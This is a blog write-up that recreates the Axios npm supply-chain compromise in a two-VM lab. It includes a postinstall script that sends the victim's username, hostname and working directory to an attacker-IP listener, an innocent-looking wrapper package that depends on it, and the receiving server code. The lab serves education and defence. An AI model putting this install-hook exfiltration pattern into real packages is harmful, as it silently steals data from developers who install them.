# Axios npm compromise—Recreation & PoC write-up

**Author:** Akshatshirsat  
**Published:** April 2, 2026  
**Tags:** Bug Bounty, NPM, Axios, Security

## Intro

Recently there was an incident involving Axios where a malicious version got pushed to npm. It wasn’t really a bug in Axios code itself, but more like someone slipped something bad into the supply chain.

From what I understood reading the [Supply Chain Attack on Axios Pulls Malicious Dependency from npm](https://socket.dev), the attacker added a hidden dependency which executed code during install. So just running `npm install` was enough to trigger it. No need to run the app or anything.

In this PoC, we are going to simulate this behavior safely, not use the real malicious package. The idea is to recreate how the attack worked so it’s easier to understand what actually happened.

What we are doing here — We are not using the real malicious package (it’s already removed anyway).

Instead, we recreate the same idea safely:

- A normal-looking package
- That depends on another hidden package
- That runs malicious hidden code during install
- And sends some data to the attacker

Basically mimicking the behavior, not the actual malware.

## Setup (lab idea)

We used 2 machines:

- **Victim VM** → runs `npm install`
- **Attacker VM** → receives data

## Step 1 — Create malicious package (hidden dependency)

We created a repo: `plain-crypto-js-lab`

<!-- Original article contains a repository/package screenshot here. The image asset was not retrievable from the Medium page extraction. -->

**plain-crypto-js-lab/package.json**

```json
{
  "name": "plain-crypto-js-lab",
  "version": "4.2.0",
  "description": "crypto helpers",
  "main": "index.js",
  "scripts": {
    "postinstall": "node setup.js"
  }
}
```

**plain-crypto-js-lab/setup.js**

The payload:

```javascript
const http = require("http");
const os = require("os");

const data = JSON.stringify({
  user: os.userInfo().username,
  host: os.hostname(),
  platform: process.platform,
  cwd: process.cwd()
});

const req = http.request(
  "http://ATTACKER's_IP:8000/collect",
  {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": data.length
    }
  }
);

req.write(data);
req.end();
console.log("[plain-crypto-js] initialized");
```

## Step 2 — Create normal-looking package

Another repo: `axios-lab`

<!-- Original article contains a repository/package screenshot here. The image asset was not retrievable from the Medium page extraction. -->

**axios-lab/package.json**

```json
{
  "name": "axios-lab",
  "version": "1.0.0",
  "description": "promise based http client",
  "main": "index.js",
  "dependencies": {
    "plain-crypto-js-lab": "git+https://github.com/0xHackshat/plain-crypto-js-lab.git"
  }
}
```

## Step 3 — Attacker server

On attacker VM:

**server.py** — to receive data coming from victim

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        print("\n[+] Data received from victim:")
        print(post_data.decode())
        self.send_response(200)
        self.end_headers()

    def do_GET(self):
        # Optional: handle GET requests (for testing)
        print("\n[+] GET request received")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

server = HTTPServer(("0.0.0.0", 8000), Handler)
print("[*] Listening on port 8000...")
server.serve_forever()
```

This server just prints whatever it receives.

## Step 4 — Trigger

On victim VM:

```bash
npm install git+https://github.com/USER/axios-lab.git
```

## What happens

- npm installs `axios-lab`
- It pulls the dependency
- Dependency runs `postinstall`
- Script executes automatically
- Data gets sent to the attacker
- No user interaction. That’s the scary part.

## Output

<!-- Original article contains output screenshot here. The image asset was not retrievable from the Medium page extraction. -->

---

**Source:** [Original Medium article](https://medium.com/@akshatshirsat77/axios-npm-compromise-recreation-poc-write-up-302ee17e659b)
